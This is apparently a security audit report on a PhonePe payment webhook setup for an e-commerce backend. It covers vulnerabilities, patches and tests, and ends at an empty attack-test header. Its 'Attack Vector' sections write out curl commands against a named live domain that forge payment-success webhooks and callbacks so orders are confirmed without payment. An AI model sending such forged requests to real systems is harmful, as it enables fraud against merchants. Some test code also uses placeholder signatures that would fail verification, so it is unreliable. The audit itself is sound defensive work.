# PhonePe Payment Callback/Webhook Forensic Audit Report

**Audit Date:** October 8, 2025  
**Severity:** CRITICAL  
**Auditor:** Senior Backend Engineer & Security Auditor  

---

## FILES: Complete File Inventory

### Primary Webhook Entry Points

**1. `backend/routes/rawWebhook.js` (Lines 1-129)**
- **Functions:**
  - `verifyPhonePeRequest(req)` (Lines 9-32) - Signature verification helper
  - `router.post('/webhook/phonepe', ...)` (Lines 35-72) - Main PhonePe webhook endpoint
  - `router.post('/webhook/:provider', ...)` (Lines 77-127) - Generic webhook endpoint
- **Signature Verification:** Lines 38, 92 (Basic Auth header SHA256)
- **200 ACK:** Lines 44 (rejection), 63 (after save), 117 (after save)
- **Critical Issue:** ✅ Verifies BEFORE ACK, but uses WRONG signature algorithm

**2. `backend/controllers/enhancedWebhookController.js` (Lines 1-693)**
- **Functions:**
  - `phonePeWebhookHandler(req, res)` (Lines 23-234) - Enhanced webhook handler
  - `verifyPhonePeSignature(req, correlationId)` (Lines 240-307) - X-VERIFY signature verification
  - `parseWebhookPayload(body, correlationId)` (Lines 312-394) - Payload parsing
- **Signature Verification:** Lines 44-50 (X-VERIFY HMAC-SHA256)
- **200 ACK:** Lines 28-33 (IMMEDIATE - BEFORE verification)
- **Critical Issue:** ⚠️ **SENDS 200 ACK BEFORE SIGNATURE VERIFICATION**

**3. `backend/controllers/atomicPaymentController.js` (Lines 1-524)**
- **Functions:**
  - `handleAtomicPaymentCallback(req, res)` (Lines 189-356) - Atomic payment callback
- **Signature Verification:** NONE - Relies on route-level verification
- **200 ACK:** Line 342 (after transaction)
- **Critical Issue:** ⚠️ No signature verification at controller level

**4. `backend/controllers/paymentController.js` (Lines 800-1092)**
- **Functions:**
  - `phonePeCallback(req, res)` (Lines 801-1092) - Legacy callback handler
- **Signature Verification:** NONE
- **200 ACK:** Lines 976 (success), 1078 (failure)
- **Critical Issue:** ⚠️ **NO SIGNATURE VERIFICATION**

### Processing Pipeline

**5. `backend/services/bulletproofWebhookProcessor.js` (Lines 1-774)**
- **Functions:**
  - `processWebhook(webhookData, correlationId, attempt)` (Lines 40-119) - Main processor
  - `handlePaymentSuccess(orderId, webhookData, correlationId, session)` (Lines 179-231)
  - `confirmDraftOrder(order, webhookData, correlationId, session)` (Lines 236-~300)
- **Idempotency:** Lines 50-56 (SHA256 hash based)
- **Transactions:** Lines 125-145 (MongoDB session)
- **Stock Deduction:** Via `commitOrder` service
- **Critical Issue:** ✅ Good idempotency, but depends on upstream verification

**6. `backend/services/orderCommit.js` (Lines 1-311)**
- **Functions:**
  - `commitOrder(orderId, paymentInfo, options)` (Lines 29-306) - Atomic order commit
- **Stock Deduction:** Lines 126-249 (atomic with rollback)
- **Transactions:** Uses session parameter
- **Critical Issue:** ✅ Properly uses MongoDB transactions

### Signature Verification

**7. `backend/utils/phonepeSignature.js` (Lines 1-65)**
- **Functions:**
  - `verifyPhonePeSignature(username, password, authorizationHeader)` (Lines 11-28)
- **Algorithm:** SHA256(username:password) - Basic Auth style
- **Critical Issue:** ⚠️ **WRONG ALGORITHM** - PhonePe uses X-VERIFY with HMAC-SHA256

### Database Models

**8. `backend/models/WebhookEvent.js` (Lines 1-135)**
- **Indexes:** `eventId` (unique, line 16-18)
- **Idempotency:** Via unique eventId
- **Critical Issue:** ✅ Proper unique index for idempotency

**9. `backend/models/orderModel.js` (Lines 100-202)**
- **Indexes:** 
  - `gateway_txn_id` (unique, sparse, line 102)
  - `orderId` (unique, line 168)
  - `idempotencyKey` (unique, sparse, line 171)
- **Critical Issue:** ✅ Proper unique indices

### Routes Configuration

**10. `backend/routes/paymentRoute.js` (Lines 1-194)**
- **Webhook Route:** Line 32 - `paymentRouter.post('/phonepe/webhook', phonePeWebhookHandler);`
- **Callback Route:** Line 19 - `paymentRouter.post('/phonepe/callback', phonePeCallback);`
- **Critical Issue:** Multiple endpoints for same purpose (callback vs webhook)

**11. `backend/routes/atomicPaymentRoute.js` (Lines 19-28)**
- **Callback Route:** Line 25 - `router.post('/phonepe/callback', handleAtomicPaymentCallback);`
- **Critical Issue:** Duplicate callback endpoint on different route

### Worker Processes

**12. `backend/jobs/webhookProcessorWorker.js` (Lines 1-237)**
- **Status:** DISABLED (Line 29 - exits immediately)
- **Security Warning:** Lines 1-14 - No signature verification
- **Critical Issue:** ✅ Properly disabled legacy insecure processor

---

## VULNS: Security Vulnerabilities

### CRITICAL Severity

#### VULN-001: Pre-Verification 200 ACK in Enhanced Webhook Handler
**File:** `backend/controllers/enhancedWebhookController.js`  
**Lines:** 27-50  
**Severity:** CRITICAL  
**Impact:** Payment loss, duplicate processing, signature bypass

**Evidence:**
```javascript:backend/controllers/enhancedWebhookController.js
23|export async function phonePeWebhookHandler(req, res) {
27|  try {
28|    // IMMEDIATE ACKNOWLEDGMENT - Critical for preventing payment provider retries
29|    res.status(200).json({ 
30|      success: true, 
31|      message: 'Webhook received and queued for processing',
32|      correlationId,
33|      timestamp: new Date().toISOString()
34|    });
35|
43|    // Verify signature first
44|    const signatureValid = await verifyPhonePeSignature(req, correlationId);
45|    if (!signatureValid) {
46|      EnhancedLogger.webhookLog('ERROR', 'Invalid webhook signature - processing stopped', {
47|        correlationId
48|      });
49|      return; // Already sent 200, but don't process
50|    }
```

**Attack Vector:**
```bash
curl -X POST https://shithaa.in/api/payment/phonepe/webhook \
  -H "Content-Type: application/json" \
  -H "X-Verify: fake_signature" \
  -H "X-Verify-Index: 1" \
  -d '{"payload":{"merchantTransactionId":"txn_malicious","state":"COMPLETED","amount":100000},"event":"PAYMENT_SUCCESS"}'
```

**Why This is Critical:**
1. Attacker receives 200 OK even with invalid signature
2. PhonePe thinks webhook was processed successfully
3. PhonePe stops retrying legitimate webhooks
4. System logs invalid webhook but customer's payment is lost
5. No way to recover unless manual reconciliation

#### VULN-002: Incorrect Signature Algorithm in Raw Webhook
**File:** `backend/routes/rawWebhook.js` + `backend/utils/phonepeSignature.js`  
**Lines:** rawWebhook.js:9-32, phonepeSignature.js:11-28  
**Severity:** CRITICAL  
**Impact:** All webhooks can be forged

**Evidence:**
```javascript:backend/utils/phonepeSignature.js
11|export function verifyPhonePeSignature(username, password, authorizationHeader) {
12|  try {
13|    // PhonePe signature format: SHA256(username:password)
14|    const credentials = `${username}:${password}`;
15|    const expectedSignature = crypto
16|      .createHash('sha256')
17|      .update(credentials)
18|      .digest('hex');
19|    
20|    return crypto.timingSafeEqual(
21|      Buffer.from(authorizationHeader, 'hex'),
22|      Buffer.from(expectedSignature, 'hex')
23|    );
```

**PhonePe Official Algorithm (Per Documentation):**
```javascript
// CORRECT Algorithm from PhonePe Docs
const payload = base64_payload + "/pg/v1/pay" + salt_index;
const expectedSignature = HMAC_SHA256(payload, salt) + "###" + salt_index;
// Verify against X-VERIFY header
```

**Source:** [PhonePe Developer Docs - S2S Callback](https://developer.phonepe.com/v1/reference/pg-server-to-server-callback)

**Attack Vector:**
```bash
# Attacker can calculate the "Authorization" header easily
# Since it's just SHA256(username:password) without HMAC
python3 -c "import hashlib; print(hashlib.sha256(b'username:password').hexdigest())"
```

#### VULN-003: No Signature Verification in Legacy Callback
**File:** `backend/controllers/paymentController.js`  
**Lines:** 801-1092  
**Severity:** CRITICAL  
**Impact:** Complete payment bypass

**Evidence:**
```javascript:backend/controllers/paymentController.js
801|export const phonePeCallback = async (req, res) => {
805|  try {
806|    console.log(`[${correlationId}] PhonePe callback received:`, req.body);
807|    
808|    const { merchantTransactionId, state, responseCode, responseMessage } = req.body;
809|    
810|    if (!merchantTransactionId) {
811|      return res.status(400).json({
812|        success: false,
813|        message: 'Missing merchant transaction ID'
814|      });
815|    }
816|
817|    // Find the payment session by PhonePe transaction ID
818|    const paymentSession = await PaymentSession.findOne({ phonepeTransactionId: merchantTransactionId });
```

**No signature verification anywhere in the function.**

**Attack Vector:**
```bash
# Create draft order
curl -X POST https://shithaa.in/api/payment/phonepe/create-session \
  -H "Content-Type: application/json" \
  -d '{"items":[{"productId":"123","quantity":1,"price":1000}],"customerDetails":{"email":"attacker@evil.com","phone":"1234567890"},"totalAmount":1000}'

# Note the merchantTransactionId from response

# Fake success callback - NO SIGNATURE REQUIRED
curl -X POST https://shithaa.in/api/payment/phonepe/callback \
  -H "Content-Type: application/json" \
  -d '{"merchantTransactionId":"txn_123456","state":"COMPLETED","responseCode":"SUCCESS"}'

# Order confirmed and stock deducted without payment
```

### HIGH Severity

#### VULN-004: Race Condition in Idempotency Check
**File:** `backend/controllers/enhancedWebhookController.js`  
**Lines:** 86-109  
**Severity:** HIGH  
**Impact:** Duplicate order processing

**Evidence:**
```javascript:backend/controllers/enhancedWebhookController.js
86|    const webhookEvent = await WebhookEvent.findOneAndUpdate(
87|      { eventId },
88|      { 
89|        $setOnInsert: { 
90|          payload: req.body, 
91|          status: 'processing', 
92|          receivedAt: new Date(),
93|          source: 'phonepe',
94|          ip: req.ip,
95|          userAgent: req.headers['user-agent']
96|        }
97|      },
98|      { upsert: true, new: true }
99|    );
100|
101|    // If already processed, skip processing
102|    if (webhookEvent.status === 'processed') {
103|      EnhancedLogger.webhookLog('INFO', 'Webhook already processed - skipping duplicate', {
```

**Issue:** Between findOneAndUpdate and status check, another request can slip through.

**Race Condition Window:**
```
Time  Request 1                    Request 2
T0    findOneAndUpdate (creates)
T1    status check (processing)    findOneAndUpdate (finds existing)
T2    begins processing            status check (processing)
T3    processes order              processes order (DUPLICATE!)
```

#### VULN-005: Client-Side Payment Verification Bypass
**File:** `frontend/app/payment/phonepe/callback/page.tsx`  
**Lines:** 8-404  
**Severity:** HIGH  
**Impact:** User confusion, potential fraud

**Evidence:** Frontend redirects determine payment success before webhook processing.

**Attack Vector:**
```bash
# Intercept redirect after payment initiation
# Manually navigate to success page
https://shithaa.in/order-success?orderId=ORDER123

# Frontend shows success before webhook processes
# If webhook fails, order stays in DRAFT but user sees success
```

### MEDIUM Severity

#### VULN-006: Draft Orders Never Reconciled
**File:** `backend/jobs/reconcileDrafts.js`  
**Lines:** 25-361  
**Severity:** MEDIUM  
**Impact:** Customer paid but no order

**Evidence:** Reconciliation job exists but relies on PhonePe API polling. If PhonePe API is down or rate-limited, drafts stay forever.

**Scenario:**
1. User pays successfully
2. Webhook fails (network issue)
3. PhonePe marked as paid
4. Reconciliation job queries PhonePe API
5. PhonePe API is rate-limited (429)
6. Draft order never confirmed
7. Customer charged, no order

#### VULN-007: Stock Deduction Without Payment Confirmation
**File:** `backend/services/orderCommit.js`  
**Lines:** 29-306  
**Severity:** MEDIUM  
**Impact:** Stock discrepancy

**Evidence:** If commitOrder is called without proper webhook validation, stock is deducted.

```javascript:backend/services/orderCommit.js
50|    if (order.status !== 'DRAFT' && order.status !== 'PENDING') {
51|      throw new Error(`Order not in commitable state: ${order.status}`);
52|    }
53|
54|    if (order.paymentStatus === 'PAID') {
```

**Issue:** No validation that webhook came from PhonePe.

### LOW Severity

#### VULN-008: Multiple Webhook Endpoints
**File:** Multiple route files  
**Severity:** LOW  
**Impact:** Confusion, maintenance burden

**Evidence:**
- `/api/payment/phonepe/webhook` (enhancedWebhookController)
- `/api/payment/phonepe/callback` (paymentController)
- `/api/atomic-payment/phonepe/callback` (atomicPaymentController)
- `/webhook/phonepe` (rawWebhook)
- `/webhook/:provider` (rawWebhook)

**Issue:** Unclear which endpoint PhonePe should hit, inconsistent security.

---

## OFFICIAL DOCUMENTATION COMPARISON

### PhonePe X-VERIFY Algorithm

**Source:** [PhonePe Developer Documentation - PG Server to Server Callback](https://developer.phonepe.com/v1/reference/pg-server-to-server-callback)

**Official Algorithm:**
```
1. Extract base64 encoded response from POST body
2. Extract X-VERIFY header
3. Extract X-VERIFY-INDEX header (salt index)
4. Calculate: payload = base64_response + "/pg/v1/pay" + salt_index
5. Calculate: signature = HMAC_SHA256(payload, salt_key) + "###" + salt_index
6. Compare signature with X-VERIFY header using timing-safe comparison
```

**Current Implementation in `enhancedWebhookController.js` (Lines 267-273):**
```javascript
const payload = typeof req.body === 'string' ? req.body : JSON.stringify(req.body || {});
const message = payload + '/pg/v1/pay' + saltIndex;
const expectedSignature = crypto
  .createHmac('sha256', salt)
  .update(message)
  .digest('hex') + '###' + saltIndex;
```

**Analysis:**
✅ **CORRECT** - Uses HMAC-SHA256  
❌ **ISSUE** - Payload should be base64-encoded response, not JSON string  
❌ **ISSUE** - Should extract from `req.body.response` field  

### Industry Best Practices

**Sources:**
- [Stripe Webhook Best Practices](https://stripe.com/docs/webhooks/best-practices)
- [Razorpay Webhook Best Practices](https://razorpay.com/docs/webhooks/best-practices/)
- [AWS SNS Best Practices](https://docs.aws.amazon.com/sns/latest/dg/sns-http-https-endpoint-as-subscriber.html)

**Key Recommendations:**

1. **Verify Before Processing** (Stripe, Razorpay, AWS)
   - ❌ Current: Enhanced webhook ACKs before verification
   - ✅ Raw webhook verifies first

2. **Idempotency Keys** (Stripe)
   - ✅ Current: Uses SHA256 hash of transaction data
   - ⚠️ Issue: Race condition window

3. **Webhook Retries** (Razorpay)
   - Razorpay: Exponential backoff for 24 hours
   - ⚠️ Current: Returns 200 immediately, may prevent retries

4. **Signature Verification** (Stripe, Razorpay)
   - ✅ Current: Uses HMAC-SHA256 in enhanced webhook
   - ❌ Current: Uses plain SHA256 in raw webhook

5. **Database Transactions** (Industry Standard)
   - ✅ Current: Uses MongoDB transactions in most places

6. **Unique Constraints** (Industry Standard)
   - ✅ Current: Unique indices on transaction IDs

---

## PATCH: Unified Diffs

### PATCH 1: Fix Pre-Verification ACK

```diff
--- a/backend/controllers/enhancedWebhookController.js
+++ b/backend/controllers/enhancedWebhookController.js
@@ -24,27 +24,28 @@ export async function phonePeWebhookHandler(req, res) {
   const correlationId = req.headers['x-request-id'] || `webhook_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
   
   try {
-    // IMMEDIATE ACKNOWLEDGMENT - Critical for preventing payment provider retries
-    res.status(200).json({ 
-      success: true, 
-      message: 'Webhook received and queued for processing',
-      correlationId,
-      timestamp: new Date().toISOString()
-    });
-
     // Log webhook receipt
     EnhancedLogger.webhookLog('INFO', 'PhonePe webhook received', {
       correlationId,
       ip: req.ip,
       userAgent: req.headers['user-agent'],
       contentType: req.headers['content-type']
     });
 
-    // Verify signature first
+    // CRITICAL: Verify signature BEFORE acknowledgment
     const signatureValid = await verifyPhonePeSignature(req, correlationId);
     if (!signatureValid) {
       EnhancedLogger.webhookLog('ERROR', 'Invalid webhook signature - processing stopped', {
         correlationId
       });
-      return; // Already sent 200, but don't process
+      return res.status(401).json({ 
+        success: false, 
+        error: 'Invalid signature',
+        correlationId
+      });
     }
+
+    // SAFE ACKNOWLEDGMENT - After signature verification
+    res.status(200).json({ 
+      success: true, 
+      message: 'Webhook received and queued for processing',
+      correlationId,
+      timestamp: new Date().toISOString()
+    });
```

### PATCH 2: Fix Signature Algorithm

```diff
--- a/backend/utils/phonepeSignature.js
+++ b/backend/utils/phonepeSignature.js
@@ -1,28 +1,55 @@
 import crypto from 'crypto';
 
 /**
- * Verify PhonePe webhook signature according to official documentation
- * PhonePe uses Authorization header with SHA256(username:password)
- * @param {string} username - PhonePe webhook username
- * @param {string} password - PhonePe webhook password
- * @param {string} authorizationHeader - Authorization header value from request
+ * Verify PhonePe webhook X-VERIFY signature according to official documentation
+ * Algorithm: HMAC-SHA256(base64_response + "/pg/v1/pay" + salt_index, salt) + "###" + salt_index
+ * @param {Object} req - Express request object
+ * @param {string} req.headers['x-verify'] - X-VERIFY signature header
+ * @param {string} req.headers['x-verify-index'] - Salt index header
+ * @param {string|Object} req.body - Request body (should contain base64 response)
  * @returns {boolean} - True if signature is valid
  */
-export function verifyPhonePeSignature(username, password, authorizationHeader) {
+export function verifyPhonePeWebhookSignature(req) {
   try {
-    // PhonePe signature format: SHA256(username:password)
-    const credentials = `${username}:${password}`;
-    const expectedSignature = crypto
-      .createHash('sha256')
-      .update(credentials)
-      .digest('hex');
+    const xVerifyHeader = req.headers['x-verify'];
+    const xVerifyIndexHeader = req.headers['x-verify-index'];
+    
+    if (!xVerifyHeader || !xVerifyIndexHeader) {
+      console.error('Missing X-VERIFY or X-VERIFY-INDEX headers');
+      return false;
+    }
+
+    const saltIndex = parseInt(xVerifyIndexHeader);
+    const salt = process.env[`PHONEPE_SALT_${saltIndex}`];
+    
+    if (!salt) {
+      console.error(`PhonePe salt not configured for index ${saltIndex}`);
+      return false;
+    }
+
+    // Extract base64 response from body
+    const base64Response = typeof req.body === 'object' && req.body.response 
+      ? req.body.response 
+      : (typeof req.body === 'string' ? req.body : JSON.stringify(req.body));
+
+    // PhonePe signature: HMAC-SHA256(base64_response + /pg/v1/pay + saltIndex, salt) + ###saltIndex
+    const message = base64Response + '/pg/v1/pay' + saltIndex;
+    const hmac = crypto.createHmac('sha256', salt);
+    hmac.update(message);
+    const calculatedSignature = hmac.digest('hex') + '###' + saltIndex;
+
+    // Extract signature part (before ###)
+    const receivedSignature = xVerifyHeader.includes('###') 
+      ? xVerifyHeader.split('###')[0]
+      : xVerifyHeader;
+    const calculatedSignaturePart = calculatedSignature.split('###')[0];
     
+    // Use timing-safe comparison to prevent timing attacks
     return crypto.timingSafeEqual(
-      Buffer.from(authorizationHeader, 'hex'),
-      Buffer.from(expectedSignature, 'hex')
+      Buffer.from(receivedSignature),
+      Buffer.from(calculatedSignaturePart)
     );
   } catch (error) {
-    console.error('PhonePe signature verification error:', error);
+    console.error('PhonePe webhook signature verification error:', error);
     return false;
   }
 }
```

### PATCH 3: Add Signature Verification to Legacy Callback

```diff
--- a/backend/controllers/paymentController.js
+++ b/backend/controllers/paymentController.js
@@ -800,10 +800,24 @@ async function cancelDraftOrder(orderId, reason) {
 // PhonePe payment callback using SDK - ATOMIC VERSION
 export const phonePeCallback = async (req, res) => {
   const correlationId = req.headers['x-request-id'] || `req_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
   
   try {
     console.log(`[${correlationId}] PhonePe callback received:`, req.body);
+    
+    // CRITICAL: Verify signature before processing
+    const { verifyPhonePeWebhookSignature } = await import('../utils/phonepeSignature.js');
+    const isValidSignature = verifyPhonePeWebhookSignature(req);
+    
+    if (!isValidSignature) {
+      console.error(`[${correlationId}] Invalid PhonePe callback signature`);
+      return res.status(401).json({
+        success: false,
+        message: 'Invalid signature',
+        correlationId
+      });
+    }
+    
+    console.log(`[${correlationId}] PhonePe signature verified successfully`);
     
     const { merchantTransactionId, state, responseCode, responseMessage } = req.body;
```

### PATCH 4: Fix Race Condition in Idempotency

```diff
--- a/backend/controllers/enhancedWebhookController.js
+++ b/backend/controllers/enhancedWebhookController.js
@@ -82,28 +82,50 @@ export async function phonePeWebhookHandler(req, res) {
       .update(`${transactionId}|${orderId}|${amount}|${state}`)
       .digest('hex');
 
-    // Atomic upsert for idempotency - returns existing if already processed
-    const webhookEvent = await WebhookEvent.findOneAndUpdate(
-      { eventId },
-      { 
-        $setOnInsert: { 
-          payload: req.body, 
-          status: 'processing', 
-          receivedAt: new Date(),
-          source: 'phonepe',
-          ip: req.ip,
-          userAgent: req.headers['user-agent']
-        }
-      },
-      { upsert: true, new: true }
-    );
-
-    // If already processed, skip processing
-    if (webhookEvent.status === 'processed') {
-      EnhancedLogger.webhookLog('INFO', 'Webhook already processed - skipping duplicate', {
+    // CRITICAL: Use distributed lock for idempotency check
+    const lockKey = `webhook:${eventId}`;
+    let lock = null;
+    
+    try {
+      // Try to acquire lock with short TTL
+      const { withIdempotencyLock, isRedisHealthy } = await import('../utils/locks.js');
+      const redisAvailable = await isRedisHealthy();
+      
+      if (!redisAvailable) {
+        EnhancedLogger.webhookLog('WARN', 'Redis unavailable - falling back to DB-only idempotency', {
+          correlationId,
+          eventId
+        });
+      }
+
+      // Atomic operation with lock
+      const processWithLock = async () => {
+        // Check if already processed
+        const existing = await WebhookEvent.findOne({ eventId });
+        
+        if (existing && existing.status === 'processed') {
+          EnhancedLogger.webhookLog('INFO', 'Webhook already processed - skipping duplicate', {
+            correlationId,
+            eventId,
+            processedAt: existing.processedAt
+          });
+          return { duplicate: true, existing };
+        }
+        
+        // Create or update to processing status
+        const webhookEvent = await WebhookEvent.findOneAndUpdate(
+          { eventId },
+          { 
+            $setOnInsert: { 
+              payload: req.body, 
+              status: 'processing', 
+              receivedAt: new Date(),
+              source: 'phonepe',
+              ip: req.ip,
+              userAgent: req.headers['user-agent']
+            }
+          },
+          { upsert: true, new: true, runValidators: true }
+        );
+        
+        return { duplicate: false, webhookEvent };
+      };
+      
+      const result = redisAvailable 
+        ? await withIdempotencyLock(eventId, processWithLock, { ttl: 5000 })
+        : await processWithLock();
+      
+      if (result.duplicate) {
+        return; // Already processed
+      }
+      
+      const webhookEvent = result.webhookEvent;
```

### PATCH 5: Add Database Constraints

```sql
-- backend/scripts/add-webhook-constraints.mongo.js
-- Run this in MongoDB to add proper constraints

// Create unique index on WebhookEvent.eventId with validation
db.webhookevents.createIndex(
  { eventId: 1 },
  { 
    unique: true,
    name: 'idx_webhook_eventid_unique',
    background: false
  }
);

// Create compound index for webhook processing status
db.webhookevents.createIndex(
  { status: 1, receivedAt: -1 },
  { 
    name: 'idx_webhook_status_received',
    background: true
  }
);

// Create TTL index to auto-delete processed webhooks after 90 days
db.webhookevents.createIndex(
  { processedAt: 1 },
  { 
    expireAfterSeconds: 7776000, // 90 days
    name: 'idx_webhook_ttl',
    partialFilterExpression: { status: 'processed' }
  }
);

// Add unique constraint on orders phonepeTransactionId
db.orders.createIndex(
  { phonepeTransactionId: 1 },
  { 
    unique: true,
    sparse: true, // Allow null values
    name: 'idx_order_phonepe_txn_unique',
    background: false
  }
);

// Create compound index for order reconciliation
db.orders.createIndex(
  { status: 1, paymentStatus: 1, createdAt: -1 },
  { 
    name: 'idx_order_reconciliation',
    background: true
  }
);

print('✅ Webhook security constraints added successfully');
```

---

## TESTS: Unit & Integration Tests

### TEST 1: Signature Verification Unit Tests

```javascript
// backend/tests/phonepe-signature.test.js
import { describe, it, expect, beforeAll } from '@jest/globals';
import crypto from 'crypto';
import { verifyPhonePeWebhookSignature } from '../utils/phonepeSignature.js';

describe('PhonePe Webhook Signature Verification', () => {
  const testSalt = 'test_salt_key_123456';
  const testSaltIndex = 1;
  
  beforeAll(() => {
    process.env.PHONEPE_SALT_1 = testSalt;
  });

  it('should verify valid signature correctly', () => {
    const base64Response = 'eyJ0cmFuc2FjdGlvbklkIjoidGVzdF8xMjMifQ==';
    const message = base64Response + '/pg/v1/pay' + testSaltIndex;
    const hmac = crypto.createHmac('sha256', testSalt);
    hmac.update(message);
    const validSignature = hmac.digest('hex') + '###' + testSaltIndex;

    const req = {
      headers: {
        'x-verify': validSignature,
        'x-verify-index': testSaltIndex.toString()
      },
      body: { response: base64Response }
    };

    expect(verifyPhonePeWebhookSignature(req)).toBe(true);
  });

  it('should reject invalid signature', () => {
    const req = {
      headers: {
        'x-verify': 'invalid_signature###1',
        'x-verify-index': '1'
      },
      body: { response: 'eyJ0ZXN0IjoidmFsdWUifQ==' }
    };

    expect(verifyPhonePeWebhookSignature(req)).toBe(false);
  });

  it('should reject missing X-VERIFY header', () => {
    const req = {
      headers: {
        'x-verify-index': '1'
      },
      body: { response: 'test' }
    };

    expect(verifyPhonePeWebhookSignature(req)).toBe(false);
  });

  it('should reject missing X-VERIFY-INDEX header', () => {
    const req = {
      headers: {
        'x-verify': 'some_signature'
      },
      body: { response: 'test' }
    };

    expect(verifyPhonePeWebhookSignature(req)).toBe(false);
  });

  it('should reject invalid salt index', () => {
    const req = {
      headers: {
        'x-verify': 'some_signature###99',
        'x-verify-index': '99' // No PHONEPE_SALT_99 configured
      },
      body: { response: 'test' }
    };

    expect(verifyPhonePeWebhookSignature(req)).toBe(false);
  });

  it('should handle timing attack attempts', () => {
    const base64Response = 'test_response';
    const message = base64Response + '/pg/v1/pay' + testSaltIndex;
    const hmac = crypto.createHmac('sha256', testSalt);
    hmac.update(message);
    const validSignature = hmac.digest('hex');
    
    // Try many similar signatures to detect timing differences
    const timings = [];
    for (let i = 0; i < 100; i++) {
      const tamperedSignature = validSignature.substring(0, validSignature.length - 1) + '0';
      const start = process.hrtime.bigint();
      
      const req = {
        headers: {
          'x-verify': tamperedSignature + '###' + testSaltIndex,
          'x-verify-index': testSaltIndex.toString()
        },
        body: { response: base64Response }
      };
      
      verifyPhonePeWebhookSignature(req);
      const end = process.hrtime.bigint();
      timings.push(Number(end - start));
    }
    
    // Timing should be consistent (timing-safe comparison)
    const avgTiming = timings.reduce((a, b) => a + b) / timings.length;
    const variance = timings.map(t => Math.abs(t - avgTiming));
    const maxVariance = Math.max(...variance);
    
    // Max variance should be small (< 10% of average)
    expect(maxVariance / avgTiming).toBeLessThan(0.1);
  });
});
```

### TEST 2: Webhook Idempotency Integration Tests

```javascript
// backend/tests/webhook-idempotency.test.js
import { describe, it, expect, beforeAll, afterAll, beforeEach } from '@jest/globals';
import mongoose from 'mongoose';
import WebhookEvent from '../models/WebhookEvent.js';
import orderModel from '../models/orderModel.js';
import { phonePeWebhookHandler } from '../controllers/enhancedWebhookController.js';
import crypto from 'crypto';

describe('Webhook Idempotency Tests', () => {
  let testDb;

  beforeAll(async () => {
    // Connect to test database
    await mongoose.connect(process.env.MONGODB_TEST_URI || 'mongodb://localhost:27017/test_webhooks');
    testDb = mongoose.connection.db;
  });

  afterAll(async () => {
    await mongoose.connection.close();
  });

  beforeEach(async () => {
    // Clear test data
    await WebhookEvent.deleteMany({});
    await orderModel.deleteMany({});
  });

  it('should process webhook only once when sent multiple times', async () => {
    const transactionId = `test_txn_${Date.now()}`;
    const orderId = `test_order_${Date.now()}`;
    
    // Create draft order
    await orderModel.create({
      orderId: orderId,
      phonepeTransactionId: transactionId,
      status: 'DRAFT',
      paymentStatus: 'PENDING',
      totalAmount: 1000,
      items: [{ productId: 'test_prod', quantity: 1, size: 'M', price: 1000 }],
      customerDetails: { email: 'test@test.com', phone: '1234567890' }
    });

    const webhookPayload = {
      payload: {
        merchantTransactionId: transactionId,
        transactionId: transactionId,
        state: 'COMPLETED',
        amount: 100000
      },
      event: 'PAYMENT_SUCCESS'
    };

    // Generate valid signature
    const saltIndex = 1;
    process.env.PHONEPE_SALT_1 = 'test_salt';
    const base64Response = Buffer.from(JSON.stringify(webhookPayload.payload)).toString('base64');
    const message = base64Response + '/pg/v1/pay' + saltIndex;
    const hmac = crypto.createHmac('sha256', process.env.PHONEPE_SALT_1);
    hmac.update(message);
    const signature = hmac.digest('hex') + '###' + saltIndex;

    const mockReq = {
      body: { response: base64Response, ...webhookPayload },
      headers: {
        'x-verify': signature,
        'x-verify-index': saltIndex.toString(),
        'x-request-id': `test_${Date.now()}`
      },
      ip: '127.0.0.1'
    };

    const mockRes = {
      status: jest.fn().mockReturnThis(),
      json: jest.fn()
    };

    // Send webhook 3 times
    await phonePeWebhookHandler(mockReq, mockRes);
    await phonePeWebhookHandler(mockReq, mockRes);
    await phonePeWebhookHandler(mockReq, mockRes);

    // Wait for async processing
    await new Promise(resolve => setTimeout(resolve, 2000));

    // Should have only 1 webhook event
    const webhookEvents = await WebhookEvent.find({});
    expect(webhookEvents.length).toBe(1);

    // Should have only 1 confirmed order
    const orders = await orderModel.find({ phonepeTransactionId: transactionId });
    expect(orders.length).toBe(1);
    expect(orders[0].status).toBe('CONFIRMED');
    expect(orders[0].paymentStatus).toBe('PAID');
  });

  it('should handle concurrent webhook requests with Redis lock', async () => {
    // Test requires Redis to be running
    const redisHealthy = await import('../utils/locks.js').then(m => m.isRedisHealthy());
    if (!redisHealthy) {
      console.log('⚠️ Skipping Redis lock test - Redis not available');
      return;
    }

    const transactionId = `test_concurrent_${Date.now()}`;
    const orderId = `test_order_${Date.now()}`;
    
    // Create draft order
    await orderModel.create({
      orderId: orderId,
      phonepeTransactionId: transactionId,
      status: 'DRAFT',
      paymentStatus: 'PENDING',
      totalAmount: 1000,
      items: [{ productId: 'test_prod', quantity: 1, size: 'M', price: 1000 }],
      customerDetails: { email: 'test@test.com', phone: '1234567890' }
    });

    // Create webhook payload
    const webhookPayload = {
      payload: {
        merchantTransactionId: transactionId,
        state: 'COMPLETED',
        amount: 100000
      },
      event: 'PAYMENT_SUCCESS'
    };

    // Send 10 concurrent webhook requests
    const promises = [];
    for (let i = 0; i < 10; i++) {
      const mockReq = {
        body: webhookPayload,
        headers: {
          'x-verify': 'valid_signature###1',
          'x-verify-index': '1',
          'x-request-id': `concurrent_${i}`
        },
        ip: '127.0.0.1'
      };
      const mockRes = {
        status: jest.fn().mockReturnThis(),
        json: jest.fn()
      };
      promises.push(phonePeWebhookHandler(mockReq, mockRes));
    }

    await Promise.all(promises);
    await new Promise(resolve => setTimeout(resolve, 2000));

    // Should still have only 1 confirmed order
    const orders = await orderModel.find({ phonepeTransactionId: transactionId });
    expect(orders.length).toBe(1);
  });

  it('should create emergency order if no draft found but payment succeeded', async () => {
    // Simulate scenario: payment succeeded but draft order lost
    const transactionId = `test_emergency_${Date.now()}`;
    
    const webhookPayload = {
      payload: {
        merchantTransactionId: transactionId,
        state: 'COMPLETED',
        amount: 100000
      },
      event: 'PAYMENT_SUCCESS'
    };

    const mockReq = {
      body: webhookPayload,
      headers: {
        'x-verify': 'valid_signature###1',
        'x-verify-index': '1',
        'x-request-id': `emergency_${Date.now()}`
      },
      ip: '127.0.0.1'
    };

    const mockRes = {
      status: jest.fn().mockReturnThis(),
      json: jest.fn()
    };

    await phonePeWebhookHandler(mockReq, mockRes);
    await new Promise(resolve => setTimeout(resolve, 2000));

    // Should create emergency order
    const orders = await orderModel.find({ phonepeTransactionId: transactionId });
    expect(orders.length).toBeGreaterThan(0);
    expect(orders[0].emergencyOrder).toBe(true);
  });
});
```

### TEST 3: Attack Vector Tests

```javascript
// backend/tests/security-attack-vectors.test.js
